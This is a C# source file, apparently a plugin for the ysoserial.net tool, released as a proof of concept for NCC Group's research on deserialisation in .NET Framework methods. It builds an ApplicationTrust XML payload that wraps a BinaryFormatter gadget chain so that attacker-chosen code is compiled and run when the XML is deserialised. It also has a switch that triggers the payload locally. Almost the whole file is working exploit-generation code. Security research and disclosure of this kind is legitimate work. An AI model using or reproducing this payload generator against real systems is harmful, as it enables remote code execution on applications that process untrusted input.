using System.Collections.Generic;
using NDesk.Options;
using System;
using ysoserial_frmv2.Generators;

/**
 * Author: Soroush Dalili (@irsdl) from NCC Group (@NCCGroupInfosec)
 * 
 * Comments: 
 *  This was released as a PoC for NCC Group's research on `Use of Deserialisation in .NET Framework Methods` (December 2018)
 *  See `ApplicationTrust.FromXml(SecurityElement) Method`: https://docs.microsoft.com/en-us/dotnet/api/system.security.policy.applicationtrust.fromxml 
 *  Security note was added after being reported: https://github.com/dotnet/dotnet-api-docs/pull/502
 *  This PoC uses BinaryFormatter from TypeConfuseDelegate
 *  This PoC produces an error and may crash the application
 **/

namespace ysoserial_frmv2.Plugins
{
    class ApplicationTrustPlugin : Plugin
    {
        static string command = "";
        static Boolean test = false;

        static OptionSet options = new OptionSet()
            {
                {"c|command=", "the command to be executed using ActivitySurrogateSelectorFromFileGenerator e.g. \"ExploitClass.cs; System.Windows.Forms.dll\"", v => command = v },
                {"t|test", "whether to run payload locally. Default: false", v => test =  v != null },
            };

        public string Name()
        {
            return "ApplicationTrust";
        }

        public string Description()
        {
            return "Generates XML payload for the ApplicationTrust class";
        }

        public OptionSet Options()
        {
            return options;
        }

        public object Run(string[] args)
        {
            List<string> extra;
            try
            {
                extra = options.Parse(args);
            }
            catch (OptionException e)
            {
                Console.Write("ysoserial: ");
                Console.WriteLine(e.Message);
                Console.WriteLine("Try 'ysoserial --help' for more information.");
                System.Environment.Exit(-1);
            }
            String payloadValue = "";
            string payload = @"<ApplicationTrust version=""1"" TrustedToRun=""true"">
<ExtraInfo Data=""{0}"">
</ExtraInfo>
<!--  the following commented tags can be enabled when needed-->
<!--
<DefaultGrant>
<PolicyStatement version=""1"">
<PermissionSet class=""System.Security.PermissionSet"" version=""1""/>
</PolicyStatement>
</DefaultGrant>
-->
</ApplicationTrust>
";
            if (String.IsNullOrEmpty(command) || String.IsNullOrEmpty(command.Trim()))
            {
                Console.Write("ysoserial: ");
                Console.WriteLine("Incorrect plugin mode/arguments combination");
                Console.WriteLine("Try 'ysoserial --help' for more information.");
                System.Environment.Exit(-1);
            }

            byte[] osf = (byte[])new ActivitySurrogateSelectorFromFileGenerator().Generate(command, "BinaryFormatter", false);
            payloadValue = BitConverter.ToString(osf).Replace("-", string.Empty);
            payload = String.Format(payload, payloadValue);

            if (test)
            {
                // PoC on how it works in practice
                System.Security.SecurityElement malPayload = System.Security.SecurityElement.FromString(payload);
                System.Security.Policy.ApplicationTrust myApplicationTrust = new System.Security.Policy.ApplicationTrust();
                myApplicationTrust.FromXml(malPayload);
                Console.WriteLine(myApplicationTrust.ExtraInfo);
            }

            return payload;
        }
    }
}
